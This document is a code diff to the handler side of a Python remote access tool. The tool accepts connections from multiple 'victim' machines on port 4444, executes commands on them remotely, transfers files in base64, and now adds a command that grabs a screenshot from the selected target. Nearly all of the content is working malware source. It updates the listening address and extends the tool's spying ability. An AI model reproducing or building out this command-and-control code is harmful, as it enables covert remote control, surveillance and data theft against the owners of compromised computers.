@@ -17,11 +17,10 @@ import json
 
 
 class Listener:
-
     NUMBER_OF_THREADS = 2
     JOB_NUMBER = [1, 2]
     queue = Queue()
-    Ip = "127.0.0.1"
+    Ip = "192.168.79.128"
     Port = 4444
     target = None
     target_ip = ""
@@ -75,6 +74,7 @@ class Listener:
             try:
                 # Wait for first connection. This is a blocking code
                 response = listener.accept()
+                # This prevents connection from timeout
                 listener.setblocking(True)
                 self.connection_list.append(response[0])
                 self.address_list.append(response[1])
@@ -107,7 +107,10 @@ class Listener:
 
             print("----Clients----" + "\n" + results)
 
-    # def select_target(self):
+    def get_screenshot(self, command):
+        self.send_data(command)
+        screenshot = self.receive_data()
+        self.write_file("{}.png".format(self.target_ip), screenshot)
 
     # Send Messages as Json format for data integrity purposes
     # Sending data plainly might cause problems because end of the data stream cannot be known
@@ -128,9 +131,6 @@ class Listener:
     # Send commands to be executed on victim machine
     def execute_remotely(self, command):
         self.send_data(command)
-        if command[0] == "exit":
-            self.target.close()
-            exit()
         return self.receive_data()
 
     # Read and write files in base64 format to transfer bytes reliably.
@@ -166,9 +166,12 @@ class Listener:
             command = input(">>")
             command = command.split(" ")
 
+            # List all available connections
             if command[0] == "list":
                 self.list_connections()
                 continue
+
+            # Select from available connections
             elif command[0] == "select":
                 try:
                     selection = int(command[1])
@@ -208,10 +211,12 @@ class Listener:
                     command.append(file_content.decode())
                     result = self.execute_remotely(command)
 
+                # List all available connections
                 elif command[0] == "list":
                     self.list_connections()
                     continue
 
+                # Select from available connections
                 elif command[0] == "select":
 
                     selection = int(command[1])
@@ -219,6 +224,15 @@ class Listener:
                     self.target_ip = self.address_list[selection]
                     print("You Have Now Connected To {}".format(self.target_ip))
                     continue
+
+                # Get screenshot from target computer
+                elif command[0] == "screenshot":
+                    self.get_screenshot(command)
+                    result = "Successfully grabbed screenshot from {}".format(self.target_ip)
+
+                # Exit to main menu
+                elif command[0] == "exit":
+                    break
 
                 else:
                     result = self.execute_remotely(command)
